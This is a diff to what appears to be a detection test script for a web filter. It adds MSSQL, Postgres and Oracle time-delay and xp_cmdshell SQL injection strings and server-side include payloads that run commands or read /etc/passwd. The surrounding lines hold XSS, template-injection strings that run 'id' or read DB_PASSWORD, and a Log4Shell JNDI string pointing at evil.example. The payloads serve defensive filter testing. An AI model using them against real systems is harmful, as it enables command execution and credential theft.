@@ -84,6 +84,13 @@ q $A sqli "percent then tautology"     "80% cotton or 1=1"
 q $A sqli "range then tautology"       "6-7 or 8=8"
 q $A sqli "integers ored together"     "99 or 1 or 1"
 q $A sqli "modulo then like"           "1%(1) or 1 like 1"
+# Aegolith: MSSQL, Postgres and Oracle time-delay and exec tokens with no leading operand (alpha.6).
+q $A sqli "waitfor delay alone"        "WAITFOR DELAY '0:0:5'"
+q $A sqli "stacked waitfor delay"      ";WAITFOR DELAY '0:0:5'"
+form $A sqli "commented waitfor in form" "email=x';WAITFOR/**/DELAY/**/'0:0:5'--"
+q $A sqli "xp_cmdshell via master"     "exec master..xp_cmdshell 'ipconfig /all'"
+json $A sqli "pg_sleep call in json"   '{"note":"pg_sleep(5)"}'
+q $A sqli "oracle dbms_lock sleep"     "DBMS_LOCK . SLEEP(5)"
 
 # --- 2. Cross-site scripting -----------------------------------------------------------------------------------
 q $A xss "script tag"                  "<script>alert(1)</script>"
@@ -196,6 +203,12 @@ json $A ssti "ruby call blank paren"   '{"note":"#{system (\"id\")}"}'
 q $A ssti "ruby safe navigation"       "#{Kernel&.open(params[:c])}"
 q $A ssti "freemarker eval binding"    "<#assign e=c?eval>\${e('id')}"
 q $A ssti "spring system environment"  "#{systemEnvironment['DB_PASSWORD']}"
+# Aegolith: server-side include directives, one inside a comment that also holds a backtick (alpha.6).
+q $A ssti "ssi exec"                   '<!--#exec cmd="ls" -->'
+json $A ssti "ssi include in json"     '{"note":"<!--#include virtual=\"/etc/passwd\" -->"}'
+q $A ssti "ssi echo"                   '<!--#echo var="DOCUMENT_URI" -->'
+q $A ssti "ssi printenv"               '<!--#printenv -->'
+json $A ssti "ssi exec with backtick"  '{"note":"<!--#exec cmd=\"ls `id`\" -->"}'
 
 # --- 7. Log4Shell / JNDI ---------------------------------------------------------------------------------------
 hdr $A log4shell "jndi in user-agent"  User-Agent "\${jndi:ldap://evil.example/a}"
